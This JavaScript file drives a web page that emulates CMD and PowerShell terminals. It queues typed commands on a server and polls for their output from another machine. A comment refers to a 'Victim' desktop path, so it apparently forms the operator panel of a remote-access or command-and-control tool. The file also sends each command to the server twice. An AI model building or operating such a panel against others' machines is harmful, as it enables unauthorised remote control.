let Route = window.currentRoutePrompt || "C:\\User>";
let lastCmdCommand = "";
let lastPsCommand = "";

const INTERNAL_COMMANDS = ['clear', 'about', 'cls', 'clear'];

document.addEventListener('click', e => {
    const terminal = e.target.closest('.cmd, .ps');
    if (!terminal) return;
    const activeInput = terminal.querySelector('input[id$="-active"]');
    if (activeInput) activeInput.focus();
});

function initTerminal(terminalId, type) {
    const terminal = document.getElementById(terminalId);
    if (!terminal || terminal.querySelector(`#${terminalId}-active`)) return;
    addNewInput(terminal, type);
}

function addNewInput(terminal, type) {
    const oldInput = document.getElementById(`${terminal.id}-active`);
    if (oldInput) {
        oldInput.removeAttribute("id");
        oldInput.disabled = true;
    }

    const line = document.createElement("div");
    line.className = "line";

    const prompt = document.createElement("span");
    prompt.className = "prompt";
    prompt.textContent = type === "cmd" ? Route : 'PS ' + Route;

    const input = document.createElement("input");
    input.className = "input";
    input.type = "text";
    input.autocomplete = "off";
    input.id = `${terminal.id}-active`;

    line.appendChild(prompt);
    line.appendChild(input);
    terminal.appendChild(line);
    input.focus();

    input.addEventListener("keydown", e => {
        if (e.key === "Enter") {
            const cmd = input.value.trim();
            if (type === "cmd") lastCmdCommand = cmd;
            else lastPsCommand = cmd;

            sendCommandToServer(cmd, type);
            handleCommand(cmd, terminal, type);
        }
    });
}

async function sendCommandToServer(cmd, type) {
    try {
        const response = await fetch('/save-command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type, command: cmd })
        });
        const data = await response.json();
        return data; // {status: "success", id: 123, type: "cmd"}
    } catch (err) {
        console.error("Error saving command:", err);
        return null;
    }
}

async function handleCommand(cmd, terminal, type) {
    const output = document.createElement("div");
    output.className = "output";
    output.dataset.type = type;

    if (cmd.trim() === ""){
        addNewInput(terminal, type);
        terminal.scrollTop = terminal.scrollHeight;
        return;
    }


    // --- دستورات داخلی ---
    if (INTERNAL_COMMANDS.includes(cmd)) {
        handleInternalCommand(cmd, terminal, type, output);
        return;
    }
    const serverData = await sendCommandToServer(cmd, type);
    let commandId;
    if (serverData && serverData.status === "success") {
        commandId = serverData.id;
    }

    terminal.appendChild(output);

    document.querySelector(".for-focus").focus();
    
    if (serverData && serverData.status === "success") {
        output.dataset.commandId = commandId;

        const waitingSpan = document.createElement("span");
        waitingSpan.textContent = " [Waiting...]";
        waitingSpan.style.color = "#ff9800";
        waitingSpan.style.fontStyle = "italic";
        output.appendChild(waitingSpan);
        waitForCommandResponse(commandId, type, output);
    }
}

function handleInternalCommand(cmd, terminal, type, output) {
    if (cmd === "clear" || cmd === "cls") {
        terminal.innerHTML = `<h2>${type === "cmd" ? "CMD" : "PowerShell"}</h2>`;
        addNewInput(terminal, type);
        return;
    }

    if (cmd === "about") {
        output.textContent = `Web ${type === "cmd" ? "CMD" : "PowerShell"} v1.0 - Created by Mostafa`;
    } else {
        output.textContent = "";
    }

    terminal.appendChild(output);
    addNewInput(terminal, type);
    terminal.scrollTop = terminal.scrollHeight;
}

const pendingCommands = new Map(); // id => { type, outputLine, intervalId, timeoutId }

function getLastPath(text) {
    const lines = text.split(/\r?\n/); // پشتیبانی از \n و \r\n
    
    for (let i = lines.length - 1; i >= 0; i--) {
        let line = lines[i].trim();
        if (line.startsWith("<path>")) {
            let path = line.slice(6).trim(); // 6 = طول "<path>"
            if (path) {
                return path;
            }
        }
    }
    return null; // اگر هیچ <path> پیدا نشد
}

async function waitForCommandResponse(commandId, type, outputLine) {
    const terminal = type === 'cmd' 
                    ? document.getElementById('cmd-terminal') 
                    : document.getElementById('ps-terminal');
    if (!commandId || pendingCommands.has(commandId)) 
    {
        addNewInput(terminal, type);
        terminal.scrollTop = terminal.scrollHeight;
        return;
    }

    let attempts = 0;
    const maxAttempts = 10;
    let hasResponse = false;

    const timeoutId = setTimeout(() => {
        clearInterval(intervalId);
        pendingCommands.delete(commandId);
        displayInfo(outputLine, "Error: Disconnected", { color: "#ff4444", weight: "bold" });
        addNewInput(terminal, type);
    }, 10000);

    const intervalId = setInterval(async () => {
        attempts++;
        if (hasResponse || attempts > maxAttempts) {
            clearInterval(intervalId);
            clearTimeout(timeoutId);
            pendingCommands.delete(commandId);
            //
            addNewInput(terminal, type);
            return;
        }

        try {
            const response = await fetch(`/get-command-info/${commandId}`);
            if (!response.ok) return;

            const data = await response.json();
            const info = data.info?.trim();

            if (info) {
                hasResponse = true;

                // تشخیص هوشمند مسیر ویندوزی (مثل C:\Users\Victim\Desktop\)
                path = getLastPath(info);
                if (path) {
                    Route = path.trim().replace(/\\+$/, '').replace(/\\?$/, '\\') + '>';
                } 
                // خروجی عادی (مثل dir یا خطای cd)
                let options = {};
                if (info.includes("The system cannot find the path specified.") ||
                    info.includes("Error ") && info.includes("Cannot change directory")) {
                    options = { color: "#ff4444", weight: "bold" };  // قرمز برای خطا
                }
                displayInfo(outputLine, info, options);

                clearInterval(intervalId);
                clearTimeout(timeoutId);
                pendingCommands.delete(commandId);
                addNewInput(terminal, type);
                if (terminal) terminal.scrollTop = terminal.scrollHeight;
            }
        } catch (err) {
            console.warn(`Polling error for ID ${commandId}:`, err);
        }
    }, 1000);

    pendingCommands.set(commandId, { type, outputLine, intervalId, timeoutId });
}

function displayInfo(outputLine, info, options = {}) {
    const {
        color = '#4CAF50',       // رنگ پیش‌فرض
        size = '14px',           // سایز پیش‌فرض
        font = 'monospace',      // فونت پیش‌فرض
        weight = 'bold'          // وزن فونت پیش‌فرض
    } = options;

    // حذف نوشته "Waiting..."
    const waitingSpan = outputLine.querySelector('span:last-child');
    if (waitingSpan && waitingSpan.textContent.includes('Waiting')) {
        waitingSpan.remove();
    }

    // ساخت یا پیدا کردن span
    let infoSpan = outputLine.querySelector('.command-info');
    if (!infoSpan) {
        infoSpan = document.createElement('span');
        infoSpan.className = 'command-info';
        infoSpan.style.marginLeft = '12px';
        outputLine.appendChild(infoSpan);
    }

    // تنظیمات قابل سفارشی‌سازی
    infoSpan.style.color = color;
    infoSpan.style.fontSize = size;
    infoSpan.style.fontFamily = font;
    infoSpan.style.fontWeight = weight;

    // تبدیل \n به <br> برای خروجی چندخطی درست (مثل dir)
    // infoSpan.innerHTML = info.replace(/\n/g, '<br>').replace(/\r/g, '');
    infoSpan.textContent = info;
}

function initializeTerminals() {
    const mainContent = document.querySelector('main');
    if (!mainContent) return;

    const cmdTerminal = document.getElementById('cmd-terminal');
    const psTerminal = document.getElementById('ps-terminal');

    if (cmdTerminal && psTerminal) {
        initTerminal("ps-terminal", "ps");
        initTerminal("cmd-terminal", "cmd");
    }

    const observer = new MutationObserver(() => {
        const cmd = document.getElementById('cmd-terminal');
        const ps = document.getElementById('ps-terminal');

        if (cmd && ps && !cmd.querySelector('#cmd-terminal-active')) {
            initTerminal("ps-terminal", "ps");
            initTerminal("cmd-terminal", "cmd");
        }
    });

    observer.observe(mainContent, { childList: true, subtree: true });
}

// --- اجرا ---
window.initializeTerminals = initializeTerminals;
initializeTerminals();

let nowTermial = 'cmd';
function switchTerminal() {
    const cmdTerminal = document.getElementById('cmd-terminal');
    const psTerminal = document.getElementById('ps-terminal');  
    if (nowTermial === 'cmd') {
        psTerminal.querySelector('span:last-of-type').textContent = 'PS ' + Route;
        cmdTerminal.style.display = 'none';
        psTerminal.style.display = 'block';
        psTerminal.querySelector('input:last-of-type').focus();
        nowTermial = 'ps';
    } else {
        cmdTerminal.querySelector('span:last-of-type').textContent = Route;
        psTerminal.style.display = 'none';
        cmdTerminal.style.display = 'block';
        cmdTerminal.querySelector('input:last-of-type').focus();
        nowTermial = 'cmd';
    }
}